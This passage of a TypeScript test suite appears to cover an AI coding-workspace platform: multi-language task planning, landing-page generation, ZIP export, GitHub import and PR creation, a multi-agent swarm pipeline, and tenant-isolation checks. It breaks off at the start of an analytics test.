    it('plans multi-file web app (index.html, styles.css, script.js) for food shop prompts instead of solution.ts', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_web_${Date.now()}`,
        userId: testUser1.id,
        name: 'Food Shop Web Project',
        description: 'Landing page test',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_food_shop_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create landing page for food shop in html css and javascript',
        goal: 'create a landing page for the food shop, in html and css, javascript',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.strictEqual(steps.length, 5, 'Must generate 5 structured steps');
      assert.ok(task.plannedFiles?.includes('index.html'), 'Planned files must include index.html');
      assert.ok(task.plannedFiles?.includes('styles.css'), 'Planned files must include styles.css');
      assert.ok(task.plannedFiles?.includes('script.js'), 'Planned files must include script.js');
      assert.ok(!task.plannedFiles?.includes('solution.ts'), 'Must never fallback to solution.ts for web prompts');

      // Verify HTML step has rich content
      const htmlStep = steps.find((s) => s.targetPath === 'index.html');
      assert.ok(htmlStep, 'index.html step must exist');
      assert.ok(htmlStep?.toolInput?.content.includes('FreshBite'), 'HTML must include restaurant title');
      assert.ok(htmlStep?.toolInput?.content.includes('cart-modal'), 'HTML must include cart modal markup');
    });

    it('executes all steps autonomously via runTaskLoop without hanging on step 2', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_auto_${Date.now()}`,
        userId: testUser1.id,
        name: 'Autonomous Food Shop Project',
        description: 'Autonomous loop test',
        permissionMode: 'approve_plan',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_auto_loop_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Build Food Shop Landing Page',
        goal: 'create a landing page for the food shop, in html and css, javascript',
        modelId: 'gemini-3.8-flash',
        status: 'running',
        isPlanApproved: true,
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);
      db.updateTask(task.id, testUser1.id, { steps, isPlanApproved: true, status: 'running' });

      // Run autonomous loop
      const completedTask = await coworkEngine.runTaskLoop(task.id, testUser1.id);

      assert.strictEqual(completedTask.status, 'completed', 'Task must complete autonomously');
      assert.strictEqual(completedTask.steps.every((s) => s.status === 'completed'), true, 'All steps must be completed');

      // Verify artifacts are stored in DB
      const artifacts = db.getArtifacts(ws.id, testUser1.id);
      assert.ok(artifacts.some((a) => a.fileName === 'index.html'), 'index.html artifact must be stored');
      assert.ok(artifacts.some((a) => a.fileName === 'styles.css'), 'styles.css artifact must be stored');
      assert.ok(artifacts.some((a) => a.fileName === 'script.js'), 'script.js artifact must be stored');
    });
  });

  describe('13. Language-Specific Code Generation & Multi-Language Cowork Execution', () => {
    it('detects requested technology and plans full Python application (models.py, main.py, test_food_shop.py)', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_py_${Date.now()}`,
        userId: testUser1.id,
        name: 'Python Food Shop Project',
        description: 'Python test workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_py_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create a food shop in python',
        goal: 'create a food shop application in python with models and tests',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.strictEqual(steps.length, 5, 'Python plan must have 5 structured steps');
      assert.ok(task.plannedFiles?.includes('models.py'), 'Must plan models.py');
      assert.ok(task.plannedFiles?.includes('main.py'), 'Must plan main.py');
      assert.ok(task.plannedFiles?.includes('test_food_shop.py'), 'Must plan test_food_shop.py');
      assert.ok(!task.plannedFiles?.includes('index.html'), 'Must NOT generate HTML when Python requested');
      assert.ok(!task.plannedFiles?.includes('solution.ts'), 'Must NOT generate TypeScript when Python requested');

      // Verify Python content contains real Python code
      const mainStep = steps.find((s) => s.targetPath === 'main.py');
      assert.ok(mainStep?.toolInput?.content.includes('class FoodShopService:'), 'main.py must contain FoodShopService class');
      assert.ok(mainStep?.toolInput?.content.includes('def add_to_cart('), 'main.py must contain add_to_cart method');

      const testStep = steps.find((s) => s.targetPath === 'test_food_shop.py');
      assert.ok(testStep?.toolInput?.content.includes('import unittest'), 'test_food_shop.py must import unittest');
    });

    it('executes Python task autonomously to 100% completion with verified filesystem artifacts', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_py_auto_${Date.now()}`,
        userId: testUser1.id,
        name: 'Python Auto Project',
        description: 'Auto loop test',
        permissionMode: 'approve_plan',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_py_auto_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Build Food Shop in Python',
        goal: 'create a food shop in python',
        modelId: 'gemini-3.8-flash',
        status: 'running',
        isPlanApproved: true,
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);
      db.updateTask(task.id, testUser1.id, { steps, isPlanApproved: true, status: 'running' });

      const completed = await coworkEngine.runTaskLoop(task.id, testUser1.id);

      assert.strictEqual(completed.status, 'completed', 'Python task must complete');
      assert.strictEqual(completed.steps.every((s) => s.status === 'completed'), true, 'All Python steps must complete');

      const artifacts = db.getArtifacts(ws.id, testUser1.id);
      assert.ok(artifacts.some((a) => a.fileName === 'models.py'), 'models.py artifact must exist');
      assert.ok(artifacts.some((a) => a.fileName === 'main.py'), 'main.py artifact must exist');
      assert.ok(artifacts.some((a) => a.fileName === 'test_food_shop.py'), 'test_food_shop.py artifact must exist');
    });

    it('detects Go language and plans Go files (models.go, main.go, main_test.go)', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_go_${Date.now()}`,
        userId: testUser1.id,
        name: 'Go Food Shop',
        description: 'Go workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_go_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create food shop in Go',
        goal: 'build a food shop backend service in golang',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.ok(task.plannedFiles?.includes('models.go'), 'Must plan models.go');
      assert.ok(task.plannedFiles?.includes('main.go'), 'Must plan main.go');
      assert.ok(task.plannedFiles?.includes('main_test.go'), 'Must plan main_test.go');
      assert.ok(!task.plannedFiles?.includes('index.html'), 'Must not generate HTML');

      const goStep = steps.find((s) => s.targetPath === 'main.go');
      assert.ok(goStep?.toolInput?.content.includes('package main'), 'main.go must contain package main');
    });

    it('detects Rust language and plans Cargo.toml and src/main.rs', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_rs_${Date.now()}`,
        userId: testUser1.id,
        name: 'Rust Food Shop',
        description: 'Rust workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_rs_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create food shop in rust',
        goal: 'build a food shop cli in rust',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.ok(task.plannedFiles?.includes('Cargo.toml'), 'Must plan Cargo.toml');
      assert.ok(task.plannedFiles?.includes('src/main.rs'), 'Must plan src/main.rs');
      assert.ok(!task.plannedFiles?.includes('index.html'), 'Must not generate HTML');
    });

    it('detects Java language and plans Product.java, FoodShop.java, Main.java', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_java_${Date.now()}`,
        userId: testUser1.id,
        name: 'Java Food Shop',
        description: 'Java workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_java_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create food shop in java',
        goal: 'create a food shop application in java with spring boot design',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.ok(task.plannedFiles?.includes('Product.java'), 'Must plan Product.java');
      assert.ok(task.plannedFiles?.includes('FoodShop.java'), 'Must plan FoodShop.java');
      assert.ok(task.plannedFiles?.includes('Main.java'), 'Must plan Main.java');
      assert.ok(!task.plannedFiles?.includes('index.html'), 'Must not generate HTML');
    });

    it('detects React and plans types.ts, App.tsx, styles.css', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_react_${Date.now()}`,
        userId: testUser1.id,
        name: 'React Food Shop',
        description: 'React workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_react_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Create food shop in react',
        goal: 'create a food shop app in react tsx',
        modelId: 'gemini-3.8-flash',
        status: 'planning',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);

      assert.ok(task.plannedFiles?.includes('types.ts'), 'Must plan types.ts');
      assert.ok(task.plannedFiles?.includes('App.tsx'), 'Must plan App.tsx');
      assert.ok(task.plannedFiles?.includes('styles.css'), 'Must plan styles.css');
      assert.ok(!task.plannedFiles?.includes('index.html'), 'Must not generate HTML');
    });

    it('handles missing local environment binary (e.g. pip on Windows) gracefully with environment notice', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_env_${Date.now()}`,
        userId: testUser1.id,
        name: 'Env Resilience Workspace',
        description: 'Test env command resilience',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const res = await coworkEngine.executeTool(
        'terminal_execute_command',
        { command: 'pip install non_existent_pkg_test' },
        ws.id,
        testUser1.id
      );

      // On platforms where pip is not installed (e.g. Windows dev without pip), it returns success with environmentNotice
      // On platforms where pip is installed, it returns standard execution result
      assert.strictEqual(typeof res.success, 'boolean');
      if (res.output?.environmentNotice) {
        assert.ok(res.output.environmentNotice.includes('runtime is not installed on this local host'));
        assert.strictEqual(res.success, true);
      }
    });
  });

  describe('14. Dynamic Web Domain Generation (Barber, Gym, Healthcare, Portfolio, SaaS, E-Commerce)', () => {
    it('accurately detects web domains from user prompts including typo "barbeer"', () => {
      assert.strictEqual(detectWebDomain('write landing page for the barbeer shop'), 'barber');
      assert.strictEqual(detectWebDomain('create a website for modern barber shop and grooming salon'), 'barber');
      assert.strictEqual(detectWebDomain('landing page for crossfit gym and personal fitness trainer'), 'gym');
      assert.strictEqual(detectWebDomain('portfolio website for senior fullstack software engineer'), 'portfolio');
      assert.strictEqual(detectWebDomain('dental clinic and pediatric doctor healthcare landing page'), 'healthcare');
      assert.strictEqual(detectWebDomain('cloud analytics saas platform landing page'), 'saas');
      assert.strictEqual(detectWebDomain('online streetwear apparel and fashion boutique shop'), 'ecommerce');
      assert.strictEqual(detectWebDomain('gourmet artisan pizza and burger restaurant'), 'restaurant');
      assert.strictEqual(detectWebDomain('create a landing page for our business'), 'generic');
    });

    it('generates authentic barber shop HTML and never includes food shop content for barber goals', () => {
      const html = generateDynamicWebHtml('write landing page for the barbeer shop');
      assert.ok(html.includes('Apex & Blade'), 'Must include barber brand Apex & Blade');
      assert.ok(html.includes('Barber'), 'Must include Barber terminology');
      assert.ok(html.includes('Grooming'), 'Must include Grooming terminology');
      assert.ok(html.includes('Hot Towel Straight Shave'), 'Must include authentic barber services');
      assert.ok(html.includes('booking-modal'), 'Must include appointment booking modal');
      // Anti-regression: Must NEVER contain food shop items
      assert.ok(!html.includes('FreshBite'), 'Must NOT contain FreshBite');
      assert.ok(!html.includes('pizza'), 'Must NOT contain pizza');
      assert.ok(!html.includes('burger'), 'Must NOT contain burger');
      assert.ok(!html.includes('Farm-to-Table'), 'Must NOT contain Farm-to-Table');
    });

    it('plans and executes end-to-end Co-Work workspace task for "write landing page for the barbeer shop"', async () => {
      const ws = db.createWorkspace({
        id: `ws_cowork_barber_${Date.now()}`,
        userId: testUser1.id,
        name: 'Apex Barber Shop Project',
        description: 'Barber landing page workspace',
        permissionMode: 'approve_plan',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_barber_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'write landing page for the barbeer shop.',
        goal: 'write landing page for the barbeer shop.',
        modelId: 'anthropic/claude-3.5-sonnet',
        status: 'running',
        isPlanApproved: true,
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const steps = await coworkEngine.planTask(task, testUser1.id);
      assert.strictEqual(steps.length, 5, 'Must generate 5 structured steps');
      assert.ok(task.plannedFiles?.includes('index.html'), 'Must plan index.html');
      assert.ok(task.plannedFiles?.includes('styles.css'), 'Must plan styles.css');
      assert.ok(task.plannedFiles?.includes('script.js'), 'Must plan script.js');

      // Verify the generated index.html step has barber content
      const htmlStep = steps.find((s) => s.targetPath === 'index.html');
      assert.ok(htmlStep, 'index.html step must exist');
      assert.ok(htmlStep?.toolInput?.content.includes('Apex & Blade'), 'HTML step must generate barber shop markup');
      assert.ok(!htmlStep?.toolInput?.content.includes('FreshBite'), 'HTML step must NOT generate FreshBite');

      db.updateTask(task.id, testUser1.id, { steps, isPlanApproved: true, status: 'running' });

      // Run autonomous loop
      const completedTask = await coworkEngine.runTaskLoop(task.id, testUser1.id);
      assert.strictEqual(completedTask.status, 'completed', 'Barber task must complete autonomously');
      assert.strictEqual(completedTask.steps.every((s) => s.status === 'completed'), true, 'All 5 steps must complete');

      // Verify the created artifacts
      const artifacts = db.getArtifacts(ws.id, testUser1.id);
      const indexArtifact = artifacts.find((a) => a.fileName === 'index.html');
      const cssArtifact = artifacts.find((a) => a.fileName === 'styles.css');
      const jsArtifact = artifacts.find((a) => a.fileName === 'script.js');

      assert.ok(indexArtifact, 'index.html artifact must exist in workspace');
      assert.ok(cssArtifact, 'styles.css artifact must exist in workspace');
      assert.ok(jsArtifact, 'script.js artifact must exist in workspace');

      assert.ok(indexArtifact?.content.includes('Apex & Blade'), 'Artifact must contain Apex & Blade');
      assert.ok(indexArtifact?.content.includes('Executive Razor Fade'), 'Artifact must contain haircut service');
      assert.ok(!indexArtifact?.content.includes('FreshBite'), 'Artifact must NOT contain FreshBite');
      assert.ok(!indexArtifact?.content.includes('pizza'), 'Artifact must NOT contain pizza');

      assert.ok(cssArtifact?.content.includes('--gold'), 'CSS must include luxury barber theme variables');
      assert.ok(jsArtifact?.content.toLowerCase().includes('appointment'), 'JS must include appointment booking logic');
    });
  });

  describe('15. Workspace Project ZIP Export & Automated Teardown', () => {
    it('generates a valid ZIP archive containing workspace files and artifacts', async () => {
      const ws = db.createWorkspace({
        id: `ws_zip_export_${Date.now()}`,
        userId: testUser1.id,
        name: 'Portfolio Alpha Project',
        description: 'Test ZIP export workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      // Add artifacts
      db.createArtifact(
        {
          id: `art_html_${Date.now()}`,
          workspaceId: ws.id,
          title: 'index.html',
          fileName: 'index.html',
          language: 'html',
          content: '<!DOCTYPE html><html><body><h1>Portfolio</h1></body></html>',
          version: 1,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        testUser1.id
      );

      db.createArtifact(
        {
          id: `art_css_${Date.now()}`,
          workspaceId: ws.id,
          title: 'styles.css',
          fileName: 'styles.css',
          language: 'css',
          content: 'body { margin: 0; background: #000; color: #fff; }',
          version: 1,
          createdAt: new Date().toISOString(),
          updatedAt: new Date().toISOString(),
        },
        testUser1.id
      );

      // Write a file to the physical workspace folder as well
      const wsRoot = workspaceManager.getWorkspaceRoot(ws);
      fs.writeFileSync(path.join(wsRoot, 'README.md'), '# Portfolio Alpha\nGenerated by Cortex AI.');

      // Spin up ephemeral express server to test endpoint
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${ws.id}/export-zip`, { headers: { 'Authorization': `Bearer ${accessToken}` } });
        assert.strictEqual(res.status, 200, 'ZIP export endpoint must return 200 OK');
        assert.ok(res.headers.get('content-type')?.includes('application/zip'), 'Content-Type must be application/zip');
        assert.ok(
          res.headers.get('content-disposition')?.includes('attachment; filename="Portfolio_Alpha_Project.zip"'),
          'Content-Disposition must specify safe filename'
        );

        const buffer = Buffer.from(await res.arrayBuffer());
        assert.ok(buffer.length > 100, 'ZIP archive must be non-empty and well-formed');
        // Validate PK zip file signature: 0x50, 0x4B, 0x03, 0x04
        assert.strictEqual(buffer[0], 0x50, 'Byte 0 must be 0x50 (P)');
        assert.strictEqual(buffer[1], 0x4B, 'Byte 1 must be 0x4B (K)');
        assert.strictEqual(buffer[2], 0x03, 'Byte 2 must be 0x03');
        assert.strictEqual(buffer[3], 0x04, 'Byte 3 must be 0x04');
      } finally {
        server.close();
      }
    });

    it('rejects unauthorized access to ZIP export', async () => {
      const ws = db.createWorkspace({
        id: `ws_unauth_zip_${Date.now()}`,
        userId: testUser1.id,
        name: 'Private Workspace',
        description: 'Unauthorized export test',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;

      try {
        // No token provided
        const res1 = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${ws.id}/export-zip`);
        assert.strictEqual(res1.status, 401, 'Must reject unauthenticated request with 401');

        // Other user's token provided
        const { accessToken: u2Token } = generateTokens(testUser2);
        const res2 = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${ws.id}/export-zip`, { headers: { 'Authorization': `Bearer ${u2Token}` } });
        assert.strictEqual(res2.status, 404, 'Must reject unauthorized tenant access with 404');
      } finally {
        server.close();
      }
    });
  });

  describe('16. Direct GitHub Repository Import & Pull Request Generator', () => {
    it('accurately parses and validates GitHub repository URLs, SSH slugs, and HTTPS links', () => {
      const validCases = [
        { input: 'Jay-Raam/Smart-ERP', expectedOwner: 'Jay-Raam', expectedRepo: 'Smart-ERP' },
        { input: 'https://github.com/Jay-Raam/Smart-ERP', expectedOwner: 'Jay-Raam', expectedRepo: 'Smart-ERP' },
        { input: 'https://github.com/Jay-Raam/Smart-ERP.git', expectedOwner: 'Jay-Raam', expectedRepo: 'Smart-ERP' },
        { input: 'git@github.com:Jay-Raam/Smart-ERP.git', expectedOwner: 'Jay-Raam', expectedRepo: 'Smart-ERP' },
        { input: 'facebook/react', expectedOwner: 'facebook', expectedRepo: 'react' },
      ];

      for (const tc of validCases) {
        const parsed = workspaceManager.parseGitHubRepoUrl(tc.input);
        assert.strictEqual(parsed.owner, tc.expectedOwner);
        assert.strictEqual(parsed.repo, tc.expectedRepo);
        assert.strictEqual(parsed.fullName, `${tc.expectedOwner}/${tc.expectedRepo}`);
      }

      assert.throws(() => workspaceManager.parseGitHubRepoUrl(''), /required/);
      assert.throws(() => workspaceManager.parseGitHubRepoUrl('invalid url format with spaces'), /Invalid GitHub repository format/);
    });

    it('creates workspace and clones repository or initializes workspace structure via import-github', async () => {
      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/import-github`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            repoUrl: 'Jay-Raam/Smart-ERP',
            name: 'Smart ERP Project',
            branch: 'main',
          }),
        });

        assert.strictEqual(res.status, 200, 'import-github must return HTTP 200 OK');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.ok(data.workspace);
        assert.strictEqual(data.workspace.githubRepo, 'Jay-Raam/Smart-ERP');
        assert.strictEqual(data.workspace.name, 'Smart ERP Project');
        assert.strictEqual(data.workspace.isLocalBinding, true);
        assert.ok(data.workspace.projectRoot);
      } finally {
        server.close();
      }
    });

    it('creates a git branch and returns compare URL or PR link via create-github-pr', async () => {
      // Create a test workspace with git repo
      const wsId = `ws_git_pr_${Date.now()}`;
      const wsDir = path.resolve(process.cwd(), 'workspaces', wsId);
      fs.mkdirSync(wsDir, { recursive: true });
      fs.writeFileSync(path.join(wsDir, 'README.md'), '# Test Project for PR', 'utf8');

      // Initialize git
      const { exec } = await import('node:child_process');
      const { promisify } = await import('node:util');
      const execAsync = promisify(exec);
      await execAsync('git init && git config user.email "test@cortex.ai" && git config user.name "Cortex Test" && git add . && git commit -m "initial commit"', { cwd: wsDir });

      const ws = db.createWorkspace({
        id: wsId,
        userId: testUser1.id,
        name: 'Git PR Workspace',
        description: 'Test PR creation',
        projectRoot: wsDir,
        isLocalBinding: true,
        githubRepo: 'Jay-Raam/Smart-ERP',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        // Add a modification
        fs.writeFileSync(path.join(wsDir, 'feature.ts'), 'export const feature = "payment_v2";', 'utf8');

        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${ws.id}/create-github-pr`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
          body: JSON.stringify({
            title: 'feat: add payment gateway v2',
            body: 'Autonomous PR implementation created via Cortex AI',
            branchName: `cortex/feature-payment-${Date.now().toString(36)}`,
          }),
        });

        assert.strictEqual(res.status, 200, 'create-github-pr must return HTTP 200');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.ok(data.branchName.startsWith('cortex/feature-payment-'));
        assert.ok(data.compareUrl?.includes('Jay-Raam/Smart-ERP/compare/main...cortex/feature-payment-'));
      } finally {
        server.close();
      }
    });

    it('rejects unauthorized PR creation on another user workspace', async () => {
      const ws = db.createWorkspace({
        id: `ws_unauth_pr_${Date.now()}`,
        userId: testUser1.id,
        name: 'Private PR Workspace',
        description: 'Tenant isolation test',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken: u2Token } = generateTokens(testUser2);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/workspaces/${ws.id}/create-github-pr`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${u2Token}`,
          },
          body: JSON.stringify({ title: 'unauthorized patch' }),
        });
        assert.strictEqual(res.status, 404, 'Must reject tenant access with 404');
      } finally {
        server.close();
      }
    });
  });


  describe('17. Multi-Agent Collaborative Swarm Workflow (Architect, Developer, Reviewer)', () => {
    it('executes 3-agent swarm pipeline (Architect -> Developer -> QA Reviewer) via runSwarmTaskLoop', async () => {
      const ws = db.createWorkspace({
        id: `ws_swarm_test_${Date.now()}`,
        userId: testUser1.id,
        name: 'Swarm Landing Page Project',
        description: 'Swarm team test workspace',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_swarm_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Build Barber Shop Landing Page via Swarm',
        goal: 'create a landing page for barber shop in html, css, js',
        modelId: 'gemini-3.8-flash',
        status: 'running',
        isPlanApproved: true,
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      // Generate initial steps
      const steps = await coworkEngine.planTask(task, testUser1.id);
      db.updateTask(task.id, testUser1.id, { steps, isPlanApproved: true, status: 'running' });

      // Run Swarm Loop
      const completedTask = await coworkEngine.runSwarmTaskLoop(task.id, testUser1.id);

      assert.strictEqual(completedTask.status, 'completed', 'Swarm task must complete successfully');
      assert.strictEqual(completedTask.isSwarmMode, true, 'isSwarmMode flag must be true');
      assert.ok(completedTask.swarmEvents && completedTask.swarmEvents.length === 3, 'Must contain 3 swarm collaboration events');

      const [archEvent, devEvent, qaEvent] = completedTask.swarmEvents;
      assert.strictEqual(archEvent.role, 'architect', 'Event 1 must be from Architect');
      assert.strictEqual(archEvent.status, 'completed');
      assert.ok(archEvent.deliverables?.includes('index.html'), 'Architect must plan index.html');

      assert.strictEqual(devEvent.role, 'developer', 'Event 2 must be from Developer');
      assert.strictEqual(devEvent.status, 'completed');

      assert.strictEqual(qaEvent.role, 'reviewer', 'Event 3 must be from QA Auditor');
      assert.strictEqual(qaEvent.status, 'completed');
      assert.ok(qaEvent.message.includes('0 high-severity vulnerabilities'), 'QA report must include security audit');

      assert.ok(completedTask.summary?.includes('Swarm Team (Architect Dr. Aris + Developer Devon + QA Serena)'), 'Summary must highlight swarm team');
    });

    it('triggers autonomous swarm execution via POST /api/cowork/tasks/:id/swarm-execute', async () => {
      const ws = db.createWorkspace({
        id: `ws_swarm_api_${Date.now()}`,
        userId: testUser1.id,
        name: 'Swarm API Workspace',
        description: 'Swarm HTTP API test',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_swarm_http_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Build Portfolio via Swarm API',
        goal: 'create a personal developer portfolio website in html and css',
        modelId: 'gemini-3.8-flash',
        status: 'running',
        isPlanApproved: true,
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);
      const steps = await coworkEngine.planTask(task, testUser1.id);
      db.updateTask(task.id, testUser1.id, { steps, isPlanApproved: true, status: 'running' });

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken } = generateTokens(testUser1);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/tasks/${task.id}/swarm-execute`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${accessToken}`,
          },
        });

        assert.strictEqual(res.status, 200, 'swarm-execute must return 200 OK');
        const data = await res.json();
        assert.strictEqual(data.success, true);
        assert.strictEqual(data.task.isSwarmMode, true);
        assert.strictEqual(data.swarmEvents.length, 3);
        assert.strictEqual(data.task.status, 'completed');
      } finally {
        server.close();
      }
    });

    it('rejects unauthorized swarm execution from another tenant', async () => {
      const ws = db.createWorkspace({
        id: `ws_swarm_unauth_${Date.now()}`,
        userId: testUser1.id,
        name: 'Private Swarm Workspace',
        description: 'Tenant isolation test',
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

      const task: AgentTask = {
        id: `task_swarm_tenant_${Date.now()}`,
        workspaceId: ws.id,
        userId: testUser1.id,
        title: 'Private Swarm Task',
        goal: 'private task',
        modelId: 'gemini-3.8-flash',
        status: 'running',
        steps: [],
        artifactIds: [],
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      };
      db.createTask(task);

      const app = express();
      app.use(express.json());
      app.use('/api', apiRouter);

      const server = await new Promise<any>((resolve) => {
        const s = app.listen(0, '127.0.0.1', () => resolve(s));
      });
      const port = (server.address() as any).port;
      const { accessToken: u2Token } = generateTokens(testUser2);

      try {
        const res = await fetch(`http://127.0.0.1:${port}/api/cowork/tasks/${task.id}/swarm-execute`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${u2Token}`,
          },
        });
        assert.strictEqual(res.status, 404, 'Must return 404 for foreign tenant');
      } finally {
        server.close();
      }
    });
  });


  describe('18. AI Token Usage & Zero-Cost Savings Analytics Dashboard', () => {
    it('aggregates prompt and completion tokens accurately across user conversations', async () => {
      const conv = db.createConversation({
        id: `conv_analytics_${Date.now()}`,
        userId: testUser1.id,
        title: 'Analytics Test Conversation',
        modelId: 'gemini-3.8-flash',
        providerId: 'gemini',
        mode: 'balanced',
        isPinned: false,
        isArchived: false,
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      });

